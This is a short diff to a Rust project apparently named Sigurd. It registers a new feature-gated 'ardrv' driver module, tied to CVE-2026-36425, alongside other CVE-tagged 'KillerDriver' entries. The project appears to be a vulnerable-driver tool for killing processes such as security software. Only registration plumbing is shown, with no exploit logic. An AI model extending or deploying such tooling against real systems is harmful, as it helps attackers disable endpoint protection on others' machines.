@@ -24,6 +24,8 @@ pub mod ccprotect;
 pub mod wamsdk;
 #[cfg(feature = "ksapi64")]
 pub mod ksapi64;
+#[cfg(feature = "ardrv")]
+pub mod ardrv;
 
 pub trait KillerDriver {
     /// Will be called on Sigurd start. 
@@ -74,6 +76,15 @@ pub fn get_drivers() -> Result<Vec<Box<dyn KillerDriver>>, SigurdError> {
 
         let throttlestop = ThrottleStop::new()?;
         driver_options.push(throttlestop);
+    }
+
+    // AppRemover Driver (CVE-2026-36425)
+    #[cfg(feature = "ardrv")]
+    {
+        use crate::drivers::ardrv::ARDRV;
+
+        let ardrv = ARDRV::new()?;
+        driver_options.push(ardrv);
     }
 
     // BdApiUtil64 (CVE-2024-51324)
